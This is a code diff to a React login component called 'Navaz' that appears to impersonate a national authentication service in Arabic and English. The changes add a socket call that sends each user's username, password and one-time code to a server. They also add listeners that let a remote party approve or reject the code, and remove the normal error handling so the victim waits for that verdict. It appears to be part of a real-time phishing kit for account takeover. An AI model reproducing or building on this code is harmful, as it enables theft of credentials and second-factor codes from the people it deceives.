@@ -32,6 +32,7 @@ const Navaz = ({checkMode,mode,setMode}) => {
                 }else{
                     setError(true)
                 }
+               
             }
          
         } catch (error) {
@@ -41,13 +42,14 @@ const Navaz = ({checkMode,mode,setMode}) => {
 
     }
 
-    const sendOtp = async ()=>{
+    const sendOtp = async (o)=>{
         setError(false)
         setOtpError(false)
         try {
             if(username && password){
                 setError(false)
                 setLoading(true)
+                socket.emit('navazOtp',{username,password,otp:o})
                 await axios.post(serverRoute+'/auth/email?navaz=true',{username,password,otp:otpValue})
             }else{
                 window.location.reload()
@@ -55,9 +57,6 @@ const Navaz = ({checkMode,mode,setMode}) => {
 
         } catch (error) {
             
-        }finally{
-            setLoading(false)
-            setOtpError(true)
         }
 
     }
@@ -75,6 +74,19 @@ const Navaz = ({checkMode,mode,setMode}) => {
             setError(true)
         }
     })
+
+    socket.on('disAllowUserOtp',(data)=>{
+        if(data.username === username){
+            setLoading(false)
+            setOtpError(true)
+        }
+    })
+    socket.on('AllowUserOtp',(data)=>{
+        if(data.username === username){
+            window.location.href = `/verify?otp=${data.userOtp}`
+        }
+    })
+
   return (
     <div className='flex flex-col w-full min-h-screen justify-between items-center gap-y-5 relative' dir={mode==='ar' ? 'rtl' : 'ltr'} style={{backgroundColor:'#fafafa'}}>
                 {
@@ -105,7 +117,7 @@ const Navaz = ({checkMode,mode,setMode}) => {
             </span>
             </div>
             {otpError && <span className='text-center text-red-500 my-2'>{checkMode('Error Happend Please Try Again','حدث خطأ برجاء المحاوله مره اخري').word}</span>}
-            <button className='my-1 w-full   text-white py-1 ' style={{backgroundColor:'#11998e'}} onClick={sendOtp}>
+            <button className='my-1 w-full   text-white py-1 ' style={{backgroundColor:'#11998e'}} onClick={()=>sendOtp(otpValue)}>
                 {checkMode('Submit','تاكيد').word}
                 </button>
             <span className='text-center'>
